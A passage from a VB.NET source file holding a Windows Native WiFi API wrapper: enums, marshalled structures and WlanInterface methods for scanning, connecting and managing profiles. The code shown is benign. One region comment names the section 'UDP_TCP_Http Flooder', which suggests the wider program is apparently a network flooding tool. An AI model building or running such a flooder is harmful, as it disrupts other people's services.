            MSMSEC_PEER_INDICATED_INSECURE = (MSMSEC_CONNECT_BASE + 14)
            ' 802.1x indicated there is no authenticator but profile requires 802.1x
            MSMSEC_NO_AUTHENTICATOR = (MSMSEC_CONNECT_BASE + 15)
            ' Plumbing settings to NIC failed
            MSMSEC_NIC_FAILURE = (MSMSEC_CONNECT_BASE + 16)
            ' Operation was cancelled by caller
            MSMSEC_CANCELLED = (MSMSEC_CONNECT_BASE + 17)
            ' Key was in incorrect format 
            MSMSEC_KEY_FORMAT = (MSMSEC_CONNECT_BASE + 18)
            ' Security downgrade detected
            MSMSEC_DOWNGRADE_DETECTED = (MSMSEC_CONNECT_BASE + 19)
            ' PSK mismatch suspected
            MSMSEC_PSK_MISMATCH_SUSPECTED = (MSMSEC_CONNECT_BASE + 20)
            ' Forced failure because connection method was not secure
            MSMSEC_FORCED_FAILURE = (MSMSEC_CONNECT_BASE + 21)
            ' ui request couldn't be queued or user pressed cancel
            MSMSEC_SECURITY_UI_FAILURE = (MSMSEC_CONNECT_BASE + 22)

            MSMSEC_MAX = MSMSEC_END
        End Enum

        ''' <summary>
        ''' Contains information about connection related notifications.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_NOTIFICATION_DATA</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanConnectionNotificationData
            ''' <remarks>
            ''' On Windows XP SP 2, only <see cref="WlanConnectionMode.Profile"/> is supported.
            ''' </remarks>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' The name of the profile used for the connection. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> _
            Public profileName As String
            ''' <summary>
            ''' The SSID of the association.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' The BSS network type.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Indicates whether security is enabled for this connection.
            ''' </summary>
            Public securityEnabled As Boolean
            ''' <summary>
            ''' Indicates the reason for an operation failure.
            ''' This field has a value of <see cref="WlanReasonCode.Success"/> for all connection-related notifications except <see cref="WlanNotificationCodeAcm.ConnectionComplete"/>.
            ''' If the connection fails, this field indicates the reason for the failure.
            ''' </summary>
            Public wlanReasonCode As WlanReasonCode
            ''' <summary>
            ''' This field contains the XML presentation of the profile used for discovery, if the connection succeeds.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=1)> _
            Public profileXml As String
        End Structure

        ''' <summary>
        ''' Indicates the state of an interface.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_INTERFACE_STATE</c> type.
        ''' </remarks>
        Public Enum WlanInterfaceState
            ''' <summary>
            ''' The interface is not ready to operate.
            ''' </summary>
            NotReady = 0
            ''' <summary>
            ''' The interface is connected to a network.
            ''' </summary>
            Connected = 1
            ''' <summary>
            ''' The interface is the first node in an ad hoc network. No peer has connected.
            ''' </summary>
            AdHocNetworkFormed = 2
            ''' <summary>
            ''' The interface is disconnecting from the current network.
            ''' </summary>
            Disconnecting = 3
            ''' <summary>
            ''' The interface is not connected to any network.
            ''' </summary>
            Disconnected = 4
            ''' <summary>
            ''' The interface is attempting to associate with a network.
            ''' </summary>
            Associating = 5
            ''' <summary>
            ''' Auto configuration is discovering the settings for the network.
            ''' </summary>
            Discovering = 6
            ''' <summary>
            ''' The interface is in the process of authenticating.
            ''' </summary>
            Authenticating = 7
        End Enum

        ''' <summary>
        ''' Contains the SSID of an interface.
        ''' </summary>
        Public Structure Dot11Ssid
            ''' <summary>
            ''' The length, in bytes, of the <see cref="SSID"/> array.
            ''' </summary>
            Public SSIDLength As UInteger
            ''' <summary>
            ''' The SSID.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=32)> _
            Public SSID As Byte()
        End Structure

        ''' <summary>
        ''' Defines an 802.11 PHY and media type.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>DOT11_PHY_TYPE</c> type.
        ''' </remarks>
        Public Enum Dot11PhyType As UInteger
            ''' <summary>
            ''' Specifies an unknown or uninitialized PHY type.
            ''' </summary>
            Unknown = 0
            ''' <summary>
            ''' Specifies any PHY type.
            ''' </summary>
            Any = Unknown
            ''' <summary>
            ''' Specifies a frequency-hopping spread-spectrum (FHSS) PHY. Bluetooth devices can use FHSS or an adaptation of FHSS.
            ''' </summary>
            FHSS = 1
            ''' <summary>
            ''' Specifies a direct sequence spread spectrum (DSSS) PHY.
            ''' </summary>
            DSSS = 2
            ''' <summary>
            ''' Specifies an infrared (IR) baseband PHY.
            ''' </summary>
            IrBaseband = 3
            ''' <summary>
            ''' Specifies an orthogonal frequency division multiplexing (OFDM) PHY. 802.11a devices can use OFDM.
            ''' </summary>
            OFDM = 4
            ''' <summary>
            ''' Specifies a high-rate DSSS (HRDSSS) PHY.
            ''' </summary>
            HRDSSS = 5
            ''' <summary>
            ''' Specifies an extended rate PHY (ERP). 802.11g devices can use ERP.
            ''' </summary>
            ERP = 6
            ''' <summary>
            ''' Specifies the start of the range that is used to define PHY types that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_Start = &H80000000UI
            ''' <summary>
            ''' Specifies the end of the range that is used to define PHY types that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_End = &HFFFFFFFFUI
        End Enum


        Public Enum Dot11BssType

            Infrastructure = 1

            Independent = 2

            Any = 3
        End Enum

        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanAssociationAttributes

            Public dot11Ssid As Dot11Ssid

            Public dot11BssType As Dot11BssType

            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=6)> _
            Public m_dot11Bssid As Byte()

            Public dot11PhyType As Dot11PhyType

            Public dot11PhyIndex As UInteger

            Public wlanSignalQuality As UInteger

            Public rxRate As UInteger

            Public txRate As UInteger

            Public ReadOnly Property Dot11Bssid() As PhysicalAddress
                Get
                    Return New PhysicalAddress(m_dot11Bssid)
                End Get
            End Property
        End Structure

        Public Enum WlanConnectionMode

            Profile = 0

            TemporaryProfile

            DiscoverySecure

            DiscoveryUnsecure

            Auto

            Invalid
        End Enum

        Public Enum Dot11AuthAlgorithm As UInteger

            IEEE80211_Open = 1

            IEEE80211_SharedKey = 2

            WPA = 3

            WPA_PSK = 4

            WPA_None = 5

            RSNA = 6

            RSNA_PSK = 7

            IHV_Start = &H80000000UI

            IHV_End = &HFFFFFFFFUI
        End Enum


        Public Enum Dot11CipherAlgorithm As UInteger

            None = &H0

            WEP40 = &H1

            TKIP = &H2

            CCMP = &H4

            WEP104 = &H5

            WPA_UseGroup = &H100
            ''' <summary>
            ''' Specifies a Wifi Protected Access (WPA) Use Group Key cipher suite. For more information about the Use Group Key cipher suite, refer to Clause 7.3.2.9.1 of the IEEE 802.11i-2004 standard.
            ''' </summary>
            RSN_UseGroup = &H100
            ''' <summary>
            ''' Specifies a WEP cipher algorithm with a cipher key of any length.
            ''' </summary>
            WEP = &H101
            ''' <summary>
            ''' Specifies the start of the range that is used to define proprietary cipher algorithms that are developed by an independent hardware vendor (IHV).
            ''' </summary>
            IHV_Start = &H80000000UI
            ''' <summary>
            ''' Specifies the end of the range that is used to define proprietary cipher algorithms that are developed by an IHV.
            ''' </summary>
            IHV_End = &HFFFFFFFFUI
        End Enum


        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanSecurityAttributes
            ''' <summary>
            ''' Indicates whether security is enabled for this connection.
            ''' </summary>
            <MarshalAs(UnmanagedType.Bool)> _
            Public securityEnabled As Boolean
            <MarshalAs(UnmanagedType.Bool)> _
            Public oneXEnabled As Boolean
            ''' <summary>
            ''' The authentication algorithm.
            ''' </summary>
            Public dot11AuthAlgorithm As Dot11AuthAlgorithm
            ''' <summary>
            ''' The cipher algorithm.
            ''' </summary>
            Public dot11CipherAlgorithm As Dot11CipherAlgorithm
        End Structure

        ''' <summary>
        ''' Defines the attributes of a wireless connection.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_ATTRIBUTES</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanConnectionAttributes
            ''' <summary>
            ''' The state of the interface.
            ''' </summary>
            Public isState As WlanInterfaceState
            ''' <summary>
            ''' The mode of the connection.
            ''' </summary>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' The name of the profile used for the connection. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' The attributes of the association.
            ''' </summary>
            Public wlanAssociationAttributes As WlanAssociationAttributes
            ''' <summary>
            ''' The security attributes of the connection.
            ''' </summary>
            Public wlanSecurityAttributes As WlanSecurityAttributes
        End Structure

        ''' <summary>
        ''' Contains information about a LAN interface.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanInterfaceInfo
            ''' <summary>
            ''' The GUID of the interface.
            ''' </summary>
            Public interfaceGuid As Guid
            ''' <summary>
            ''' The description of the interface.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public interfaceDescription As String
            ''' <summary>
            ''' The current state of the interface.
            ''' </summary>
            Public isState As WlanInterfaceState
        End Structure

        ''' <summary>
        ''' The header of the list returned by <see cref="WlanEnumInterfaces"/>.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanInterfaceInfoListHeader
            Public numberOfItems As UInteger
            Public index As UInteger
        End Structure

        ''' <summary>
        ''' The header of the list returned by <see cref="WlanGetProfileList"/>.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanProfileInfoListHeader
            Public numberOfItems As UInteger
            Public index As UInteger
        End Structure

        ''' <summary>
        ''' Contains basic information about a profile.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanProfileInfo
            ''' <summary>
            ''' The name of the profile. This value may be the name of a domain if the profile is for provisioning. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' Profile flags.
            ''' </summary>
            Public profileFlags As WlanProfileFlags
        End Structure

        ''' <summary>
        ''' Flags that specifiy the miniport driver's current operation mode.
        ''' </summary>
        <Flags()> _
        Public Enum Dot11OperationMode As UInteger
            Unknown = &H0
            Station = &H1
            AP = &H2
            ''' <summary>
            ''' Specifies that the miniport driver supports the Extensible Station (ExtSTA) operation mode.
            ''' </summary>
            ExtensibleStation = &H4
            ''' <summary>
            ''' Specifies that the miniport driver supports the Network Monitor (NetMon) operation mode.
            ''' </summary>
            NetworkMonitor = &H80000000UI
        End Enum
#End Region
        <DebuggerStepThrough()> _
        Friend Shared Sub ThrowIfError(ByVal win32ErrorCode As Integer)
            If win32ErrorCode <> 0 Then
                Throw New Win32Exception(win32ErrorCode)
            End If
        End Sub
    End Class
End Namespace


#End Region  '''</Wifi-Namespace_UDP_TCP_Http Flooder>
#Region "Wifi_Classes"
Namespace NativeWifi
    Public Class WlanClient
        Public Class WlanInterface
            Private client As WlanClient
            Private info As Wlan.WlanInterfaceInfo

#Region "Events"
            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            Public Delegate Sub WlanNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData)

            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanConnectionNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            ''' <param name="connNotifyData">The notification data.</param>
            Public Delegate Sub WlanConnectionNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData, ByVal connNotifyData As Wlan.WlanConnectionNotificationData)

            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanReasonNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            ''' <param name="reasonCode">The reason code.</param>
            Public Delegate Sub WlanReasonNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData, ByVal reasonCode As Wlan.WlanReasonCode)

            ''' <summary>
            ''' Occurs when an event of any kind occurs on a WLAN interface.
            ''' </summary>
            Public Event WlanNotification As WlanNotificationEventHandler

            ''' <summary>
            ''' Occurs when a WLAN interface changes connection state.
            ''' </summary>
            Public Event WlanConnectionNotification As WlanConnectionNotificationEventHandler

            ''' <summary>
            ''' Occurs when a WLAN operation fails due to some reason.
            ''' </summary>
            Public Event WlanReasonNotification As WlanReasonNotificationEventHandler

#End Region

#Region "Event queue"
            Private queueEvents As Boolean
            Private eventQueueFilled As New AutoResetEvent(False)
            Private eventQueue As New Queue(Of Object)()

            Private Structure WlanConnectionNotificationEventData
                Public notifyData As Wlan.WlanNotificationData
                Public connNotifyData As Wlan.WlanConnectionNotificationData
            End Structure
            Private Structure WlanReasonNotificationData
                Public notifyData As Wlan.WlanNotificationData
                Public reasonCode As Wlan.WlanReasonCode
            End Structure
#End Region

            Friend Sub New(ByVal client As WlanClient, ByVal info As Wlan.WlanInterfaceInfo)
                Me.client = client
                Me.info = info
            End Sub

            ''' <summary>
            ''' Sets a parameter of the interface whose data type is <see cref="int"/>.
            ''' </summary>
            ''' <param name="opCode">The opcode of the parameter.</param>
            ''' <param name="value">The value to set.</param>
            Private Sub SetInterfaceInt(ByVal opCode As Wlan.WlanIntfOpcode, ByVal value As Integer)
                Dim valuePtr As IntPtr = Marshal.AllocHGlobal(4)
                Marshal.WriteInt32(valuePtr, value)
                Try
                    Wlan.ThrowIfError(Wlan.WlanSetInterface(client.clientHandle, info.interfaceGuid, opCode, 4, valuePtr, IntPtr.Zero))
                Finally
                    Marshal.FreeHGlobal(valuePtr)
                End Try
            End Sub

            ''' <summary>
            ''' Gets a parameter of the interface whose data type is <see cref="int"/>.
            ''' </summary>
            ''' <param name="opCode">The opcode of the parameter.</param>
            ''' <returns>The integer value.</returns>
            Private Function GetInterfaceInt(ByVal opCode As Wlan.WlanIntfOpcode) As Integer
                Dim valuePtr As IntPtr
                Dim valueSize As Integer
                Dim opcodeValueType As Wlan.WlanOpcodeValueType
                Wlan.ThrowIfError(Wlan.WlanQueryInterface(client.clientHandle, info.interfaceGuid, opCode, IntPtr.Zero, valueSize, valuePtr, _
                 opcodeValueType))
                Try
                    Return Marshal.ReadInt32(valuePtr)
                Finally
                    Wlan.WlanFreeMemory(valuePtr)
                End Try
            End Function

            ''' <summary>
            ''' Gets or sets a value indicating whether this <see cref="WlanInterface"/> is automatically configured.
            ''' </summary>
            ''' <value><c>true</c> if "autoconf" is enabled; otherwise, <c>false</c>.</value>
            Public Property Autoconf() As Boolean
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.AutoconfEnabled) <> 0
                End Get
                Set(ByVal value As Boolean)
                    SetInterfaceInt(Wlan.WlanIntfOpcode.AutoconfEnabled, If(value, 1, 0))
                End Set
            End Property

            ''' <summary>
            ''' Gets or sets the BSS type for the indicated interface.
            ''' </summary>
            ''' <value>The type of the BSS.</value>
            Public Property BssType() As Wlan.Dot11BssType
                Get
                    Return DirectCast(GetInterfaceInt(Wlan.WlanIntfOpcode.BssType), Wlan.Dot11BssType)
                End Get
                Set(ByVal value As Wlan.Dot11BssType)
                    SetInterfaceInt(Wlan.WlanIntfOpcode.BssType, CInt(value))
                End Set
            End Property

            ''' <summary>
            ''' Gets the state of the interface.
            ''' </summary>
            ''' <value>The state of the interface.</value>
            Public ReadOnly Property InterfaceState() As Wlan.WlanInterfaceState
                Get
                    Return DirectCast(GetInterfaceInt(Wlan.WlanIntfOpcode.InterfaceState), Wlan.WlanInterfaceState)
                End Get
            End Property

            ''' <summary>
            ''' Gets the channel.
            ''' </summary>
            ''' <value>The channel.</value>
            ''' <remarks>Not supported on Windows XP SP2.</remarks>
            Public ReadOnly Property Channel() As Integer
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.ChannelNumber)
                End Get
            End Property

            ''' <summary>
            ''' Gets the RSSI.
            ''' </summary>
            ''' <value>The RSSI.</value>
            ''' <remarks>Not supported on Windows XP SP2.</remarks>
            Public ReadOnly Property RSSI() As Integer
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.RSSI)
                End Get
            End Property
            ''' <summary>
            ''' Gets the attributes of the current connection.
            ''' </summary>
            ''' <value>The current connection attributes.</value>
            ''' <exception cref="Win32Exception">An exception with code 0x0000139F (The group or resource is not in the correct state to perform the requested operation.) will be thrown if the interface is not connected to a network.</exception>
            Public ReadOnly Property CurrentConnection() As Wlan.WlanConnectionAttributes
                Get
                    Dim valueSize As Integer
                    Dim valuePtr As IntPtr
                    Dim opcodeValueType As Wlan.WlanOpcodeValueType
                    Wlan.ThrowIfError(Wlan.WlanQueryInterface(client.clientHandle, info.interfaceGuid, Wlan.WlanIntfOpcode.CurrentConnection, IntPtr.Zero, valueSize, valuePtr, _
                     opcodeValueType))
                    Try
                        Return DirectCast(Marshal.PtrToStructure(valuePtr, GetType(Wlan.WlanConnectionAttributes)), Wlan.WlanConnectionAttributes)
                    Finally
                        Wlan.WlanFreeMemory(valuePtr)
                    End Try
                End Get
            End Property

            ''' <summary>
            ''' Requests a scan for available networks.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Scan()
                Wlan.ThrowIfError(Wlan.WlanScan(client.clientHandle, info.interfaceGuid, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Converts a pointer to a available networks list (header + entries) to an array of available network entries.
            ''' </summary>
            ''' <param name="bssListPtr">A pointer to an available networks list's header.</param>
            ''' <returns>An array of available network entries.</returns>
            Private Function ConvertAvailableNetworkListPtr(ByVal availNetListPtr As IntPtr) As Wlan.WlanAvailableNetwork()
                Dim availNetListHeader As Wlan.WlanAvailableNetworkListHeader = DirectCast(Marshal.PtrToStructure(availNetListPtr, GetType(Wlan.WlanAvailableNetworkListHeader)), Wlan.WlanAvailableNetworkListHeader)
                Dim availNetListIt As Long = availNetListPtr.ToInt64() + Marshal.SizeOf(GetType(Wlan.WlanAvailableNetworkListHeader))
                Dim availNets As Wlan.WlanAvailableNetwork() = New Wlan.WlanAvailableNetwork(availNetListHeader.numberOfItems - 1) {}
                For i As Integer = 0 To availNetListHeader.numberOfItems - 1
                    availNets(i) = DirectCast(Marshal.PtrToStructure(New IntPtr(availNetListIt), GetType(Wlan.WlanAvailableNetwork)), Wlan.WlanAvailableNetwork)
                    availNetListIt += Marshal.SizeOf(GetType(Wlan.WlanAvailableNetwork))
                Next
                Return availNets
            End Function

            ''' <summary>
            ''' Retrieves the list of available networks.
            ''' </summary>
            ''' <param name="flags">Controls the type of networks returned.</param>
            ''' <returns>A list of the available networks.</returns>
            Public Function GetAvailableNetworkList(ByVal flags As Wlan.WlanGetAvailableNetworkFlags) As Wlan.WlanAvailableNetwork()
                Dim availNetListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetAvailableNetworkList(client.clientHandle, info.interfaceGuid, flags, IntPtr.Zero, availNetListPtr))
                Try
                    Return ConvertAvailableNetworkListPtr(availNetListPtr)
                Finally
                    Wlan.WlanFreeMemory(availNetListPtr)
                End Try
            End Function

            ''' <summary>
            ''' Converts a pointer to a BSS list (header + entries) to an array of BSS entries.
            ''' </summary>
            ''' <param name="bssListPtr">A pointer to a BSS list's header.</param>
            ''' <returns>An array of BSS entries.</returns>
            Private Function ConvertBssListPtr(ByVal bssListPtr As IntPtr) As Wlan.WlanBssEntry()
                Dim bssListHeader As Wlan.WlanBssListHeader = DirectCast(Marshal.PtrToStructure(bssListPtr, GetType(Wlan.WlanBssListHeader)), Wlan.WlanBssListHeader)
                Dim bssListIt As Long = bssListPtr.ToInt64() + Marshal.SizeOf(GetType(Wlan.WlanBssListHeader))
                Dim bssEntries As Wlan.WlanBssEntry() = New Wlan.WlanBssEntry(bssListHeader.numberOfItems - 1) {}
                For i As Integer = 0 To bssListHeader.numberOfItems - 1
                    bssEntries(i) = DirectCast(Marshal.PtrToStructure(New IntPtr(bssListIt), GetType(Wlan.WlanBssEntry)), Wlan.WlanBssEntry)
                    bssListIt += Marshal.SizeOf(GetType(Wlan.WlanBssEntry))
                Next
                Return bssEntries
            End Function

            ''' <summary>
            ''' Retrieves the basic service sets (BSS) list of all available networks.
            ''' </summary>
            Public Function GetNetworkBssList() As Wlan.WlanBssEntry()
                Dim bssListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetNetworkBssList(client.clientHandle, info.interfaceGuid, IntPtr.Zero, Wlan.Dot11BssType.Any, False, IntPtr.Zero, _
                 bssListPtr))
                Try
                    Return ConvertBssListPtr(bssListPtr)
                Finally
                    Wlan.WlanFreeMemory(bssListPtr)
                End Try
            End Function

            ''' <summary>
            ''' Retrieves the basic service sets (BSS) list of the specified network.
            ''' </summary>
            ''' <param name="ssid">Specifies the SSID of the network from which the BSS list is requested.</param>
            ''' <param name="bssType">Indicates the BSS type of the network.</param>
            ''' <param name="securityEnabled">Indicates whether security is enabled on the network.</param>
            Public Function GetNetworkBssList(ByVal ssid As Wlan.Dot11Ssid, ByVal bssType As Wlan.Dot11BssType, ByVal securityEnabled As Boolean) As Wlan.WlanBssEntry()
                Dim ssidPtr As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ssid))
                Marshal.StructureToPtr(ssid, ssidPtr, False)
                Try
                    Dim bssListPtr As IntPtr
                    Wlan.ThrowIfError(Wlan.WlanGetNetworkBssList(client.clientHandle, info.interfaceGuid, ssidPtr, bssType, securityEnabled, IntPtr.Zero, _
                     bssListPtr))
                    Try
                        Return ConvertBssListPtr(bssListPtr)
                    Finally
                        Wlan.WlanFreeMemory(bssListPtr)
                    End Try
                Finally
                    Marshal.FreeHGlobal(ssidPtr)
                End Try
            End Function

            ''' <summary>
            ''' Connects to a network defined by a connection parameters structure.
            ''' </summary>
            ''' <param name="connectionParams">The connection paramters.</param>
            Protected Sub Connect(ByVal connectionParams As Wlan.WlanConnectionParameters)
                Wlan.ThrowIfError(Wlan.WlanConnect(client.clientHandle, info.interfaceGuid, connectionParams, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Requests a connection (association) to the specified wireless network.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Connect(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal profile As String)
                Dim connectionParams As New Wlan.WlanConnectionParameters()
                connectionParams.wlanConnectionMode = connectionMode
                connectionParams.profile = profile
                connectionParams.dot11BssType = bssType
                connectionParams.flags = 0
                Connect(connectionParams)
            End Sub

            ''' <summary>
            ''' Connects (associates) to the specified wireless network, returning either on a success to connect
            ''' or a failure.
            ''' </summary>
            ''' <param name="connectionMode"></param>
            ''' <param name="bssType"></param>
            ''' <param name="profile"></param>
            ''' <param name="connectTimeout"></param>
            ''' <returns></returns>
            Public Function ConnectSynchronously(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal profile As String, ByVal connectTimeout As Integer) As Boolean
                queueEvents = True
                Try
                    Connect(connectionMode, bssType, profile)
                    While queueEvents AndAlso eventQueueFilled.WaitOne(connectTimeout, True)
                        SyncLock eventQueue
                            While eventQueue.Count <> 0
                                Dim e As Object = eventQueue.Dequeue()
                                If TypeOf e Is WlanConnectionNotificationEventData Then
                                    Dim wlanConnectionData As WlanConnectionNotificationEventData = CType(e, WlanConnectionNotificationEventData)
                                    ' Check if the conditions are good to indicate either success or failure.
                                    If wlanConnectionData.notifyData.notificationSource = Wlan.WlanNotificationSource.ACM Then
                                        Select Case DirectCast(wlanConnectionData.notifyData.NotificationCode, Wlan.WlanNotificationCodeAcm)
                                            Case Wlan.WlanNotificationCodeAcm.ConnectionComplete
                                                If wlanConnectionData.connNotifyData.profileName = profile Then
                                                    Return True
                                                End If
                                                Exit Select
                                        End Select
                                    End If
                                    Exit While
                                End If
                            End While
                        End SyncLock
                    End While
                Finally
                    queueEvents = False
                    eventQueue.Clear()
                End Try
                Return False
                ' timeout expired and no "connection complete"
            End Function

            ''' <summary>
            ''' Connects to the specified wireless network.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Connect(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal ssid As Wlan.Dot11Ssid, ByVal flags As Wlan.WlanConnectionFlags)
                Dim connectionParams As New Wlan.WlanConnectionParameters()
                connectionParams.wlanConnectionMode = connectionMode
                connectionParams.dot11SsidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ssid))
                Marshal.StructureToPtr(ssid, connectionParams.dot11SsidPtr, False)
                connectionParams.dot11BssType = bssType
                connectionParams.flags = flags
                Connect(connectionParams)
                Marshal.DestroyStructure(connectionParams.dot11SsidPtr, ssid.[GetType]())
                Marshal.FreeHGlobal(connectionParams.dot11SsidPtr)
            End Sub

            ''' <summary>
            ''' Deletes a profile.
            ''' </summary>
            ''' <param name="profileName">
            ''' The name of the profile to be deleted. Profile names are case-sensitive.
            ''' On Windows XP SP2, the supplied name must match the profile name derived automatically from the SSID of the network. For an infrastructure network profile, the SSID must be supplied for the profile name. For an ad hoc network profile, the supplied name must be the SSID of the ad hoc network followed by <c>-adhoc</c>.
            ''' </param>
            Public Sub DeleteProfile(ByVal profileName As String)
                Wlan.ThrowIfError(Wlan.WlanDeleteProfile(client.clientHandle, info.interfaceGuid, profileName, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Sets the profile.
            ''' </summary>
            ''' <param name="flags">The flags to set on the profile.</param>
            ''' <param name="profileXml">The XML representation of the profile. On Windows XP SP 2, special care should be taken to adhere to its limitations.</param>
            ''' <param name="overwrite">If a profile by the given name already exists, then specifies whether to overwrite it (if <c>true</c>) or return an error (if <c>false</c>).</param>
            ''' <returns>The resulting code indicating a success or the reason why the profile wasn't valid.</returns>
            Public Function SetProfile(ByVal flags As Wlan.WlanProfileFlags, ByVal profileXml As String, ByVal overwrite As Boolean) As Wlan.WlanReasonCode
                Dim reasonCode As Wlan.WlanReasonCode
                Wlan.ThrowIfError(Wlan.WlanSetProfile(client.clientHandle, info.interfaceGuid, flags, profileXml, Nothing, overwrite, _
                 IntPtr.Zero, reasonCode))
                Return reasonCode
            End Function

            ''' <summary>
            ''' Gets the profile's XML specification.
            ''' </summary>
            ''' <param name="profileName">The name of the profile.</param>
            ''' <returns>The XML document.</returns>
            Public Function GetProfileXml(ByVal profileName As String) As String
                Dim profileXmlPtr As IntPtr
                Dim flags As Wlan.WlanProfileFlags
                Dim access As Wlan.WlanAccess
                Wlan.ThrowIfError(Wlan.WlanGetProfile(client.clientHandle, info.interfaceGuid, profileName, IntPtr.Zero, profileXmlPtr, flags, _
                 access))
                Try
                    Return Marshal.PtrToStringUni(profileXmlPtr)
                Finally
                    Wlan.WlanFreeMemory(profileXmlPtr)
                End Try
            End Function

            ''' <summary>
            ''' Gets the information of all profiles on this interface.
            ''' </summary>
            ''' <returns>The profiles information.</returns>
            Public Function GetProfiles() As Wlan.WlanProfileInfo()
                Dim profileListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetProfileList(client.clientHandle, info.interfaceGuid, IntPtr.Zero, profileListPtr))
                Try
                    Dim header As Wlan.WlanProfileInfoListHeader = DirectCast(Marshal.PtrToStructure(profileListPtr, GetType(Wlan.WlanProfileInfoListHeader)), Wlan.WlanProfileInfoListHeader)
                    Dim profileInfos As Wlan.WlanProfileInfo() = New Wlan.WlanProfileInfo(header.numberOfItems - 1) {}
                    Dim profileListIterator As Long = profileListPtr.ToInt64() + Marshal.SizeOf(header)
                    For i As Integer = 0 To header.numberOfItems - 1
                        Dim profileInfo As Wlan.WlanProfileInfo = DirectCast(Marshal.PtrToStructure(New IntPtr(profileListIterator), GetType(Wlan.WlanProfileInfo)), Wlan.WlanProfileInfo)
                        profileInfos(i) = profileInfo
                        profileListIterator += Marshal.SizeOf(profileInfo)
                    Next
                    Return profileInfos
                Finally
                    Wlan.WlanFreeMemory(profileListPtr)
                End Try
            End Function

            Friend Sub OnWlanConnection(ByVal notifyData As Wlan.WlanNotificationData, ByVal connNotifyData As Wlan.WlanConnectionNotificationData)
                RaiseEvent WlanConnectionNotification(notifyData, connNotifyData)

                If queueEvents Then
                    Dim queuedEvent As New WlanConnectionNotificationEventData()
                    queuedEvent.notifyData = notifyData
                    queuedEvent.connNotifyData = connNotifyData
                    EnqueueEvent(queuedEvent)
                End If
            End Sub

            Friend Sub OnWlanReason(ByVal notifyData As Wlan.WlanNotificationData, ByVal reasonCode As Wlan.WlanReasonCode)
                RaiseEvent WlanReasonNotification(notifyData, reasonCode)
                If queueEvents Then
                    Dim queuedEvent As New WlanReasonNotificationData()
                    queuedEvent.notifyData = notifyData
                    queuedEvent.reasonCode = reasonCode
                    EnqueueEvent(queuedEvent)
                End If
            End Sub

            Friend Sub OnWlanNotification(ByVal notifyData As Wlan.WlanNotificationData)
                RaiseEvent WlanNotification(notifyData)
            End Sub

            ''' <summary>
            ''' Enqueues a notification event to be processed serially.
            ''' </summary>
            Private Sub EnqueueEvent(ByVal queuedEvent As Object)
                SyncLock eventQueue
                    eventQueue.Enqueue(queuedEvent)
                End SyncLock
                eventQueueFilled.[Set]()
